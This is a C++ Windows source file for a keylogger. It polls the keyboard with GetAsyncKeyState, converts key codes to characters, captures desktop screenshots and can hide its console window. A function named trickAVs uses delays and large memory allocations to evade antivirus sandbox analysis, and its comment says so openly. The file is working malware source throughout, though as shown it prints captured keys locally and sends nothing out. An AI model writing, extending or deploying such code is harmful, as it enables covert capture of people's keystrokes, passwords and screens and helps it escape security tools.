#include "stdafx.h"
#include <windows.h>
#include <cstdlib>
#include <iostream>
#include <gdiplus.h>
#include <stdio.h>
#include <iostream>
#include <atlimage.h> 
#include <Gdiplusimaging.h> 
#pragma comment(lib,"gdiplus.lib")
#pragma comment (lib, "user32.lib")
//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "ws2_32.lib")
using namespace Gdiplus;

//		G L O B A L S
bool		wasAltPressed;
bool		wasShiftPressed;
wchar_t		fileName[256];
HANDLE		hFile = INVALID_HANDLE_VALUE;
DWORD		dwBytesWritten;
//if true, hide cmd.exe - FYI output is written on stdout
const bool	hideConsoleAtStart = false; 
// don't go below 3 seconds, though
const int	howMuchSecondsWaitAtStart = 3; 


DWORD FetchKeyCode( ) {
    DWORD i     = 0x00;
    DWORD ret   = 0x00;
    do{
        if( GetAsyncKeyState(i)&0x1 )
            ret = i;
        i++;
    }while( !ret && i < 0xFF );

    return ret;
}
//*********************************************************
char VKtoCHAR(int vk) {
    static UCHAR keyboardState[256];
    USHORT asciiVal;
	//get layout
    static HKL layout = GetKeyboardLayout(0);     
	//get keyboard state (shift etc)
    if( GetKeyboardState(keyboardState) == false )
        return 0;
    if( ToAsciiEx( vk, MapVirtualKey(vk,0), keyboardState, &asciiVal, 0, layout ) == 0 )/*ASCII*/
        return 0;
    return static_cast<char>(asciiVal);
}
//*********************************************************
bool determineOS() {
	//on what OS we r ?
    DWORD   version = GetVersion();
    DWORD   major   = (DWORD)(LOBYTE(LOWORD(version)));
    DWORD   minor   = (DWORD)(HIBYTE(LOWORD(version)));
	size_t sz = 0;

    if ((major > 6) || ((major == 6) && (minor >= 1)))  {
        //OS is win7 or later
        char * myhome;
		if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)  {
			_stprintf_s(fileName, L"%s%s", myhome, "\\AppData\\Local\\Temp\\wut");
			free(myhome);
			return true;
		}
    } else if ((major > 5) || ((major == 5) && (minor >= 1)))  {
        //OS is xp or later
		char * myhome;
        if (_dupenv_s(&myhome, &sz, "USERPROFILE") == 0)  {
			_stprintf_s(fileName, L"%s%s", myhome, "\\Local Settings\\Temp\\wut");
			free(myhome);
			return true;
		}
    }

	return false;
}
//*********************************************************
void trickAVs() { 
	//dear AV, fool ya
	Sleep(howMuchSecondsWaitAtStart * 1000);
	int *t,/* *y, */*u, *p = NULL;
	t = new int[29999999];
	//y = new int[123];
	u = new int[9999999];
	//p = new int[9999999];
	for (int i = 0; i < 9999998; ++i) {
		t[i] = /*p[i] =*/ u[i];
	}
	//t = y;
	u = p = u = p;
	Sleep(1000);
	if( 5 >= 5 ) {
		delete[] t; 
		//delete[] y; 
		delete[] u; 
		//delete[] p;
	}
}
//*********************************************************
bool TakeScreenshot() {
	//CString w = "x.bmp";
	//HBITMAP hBitmap;
	CImage image; 
	int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    SelectObject(hCaptureDC,hCaptureBitmap); 
    BitBlt(hCaptureDC,0,0,nScreenWidth,nScreenHeight,
           hDesktopDC,0,0,SRCCOPY|CAPTUREBLT); 
	image.Attach(hCaptureBitmap);
	image.Save(L"screenshot.png"); 
	return true;
}
//---------------------------------------------------------
int main(int argc, char *argv[]) {

	if (hideConsoleAtStart == true)	{
		HWND hWnd = GetConsoleWindow();
		std::cout << "We are hiding command line.";
		Sleep(1000);
		ShowWindow( hWnd, SW_HIDE);
	}

	if (!determineOS())	{
		//we are exiting, but probably we can work trough that
		std::cout << "can't determine OS; exiting";
		Sleep(500);
		return 0xDEADBEEF;
	}

	std::cout << "Press, any time:\n\t q to quit\n\ts to take the screenshot" << std::endl;

	DWORD key = 0;
	while(key != 81/*Q*/) {

		key = FetchKeyCode();

		if (key >= 8 && key <= 222) {
			std::cout << (char)key;

			if (key == 83/*S*/) {
				TakeScreenshot();
				std::cout << "\nScreenshot taken.\n";
			}
		}
        Sleep((rand() % 10) + 10);
	}
	
	return 0;
}
//----------------------------------------------------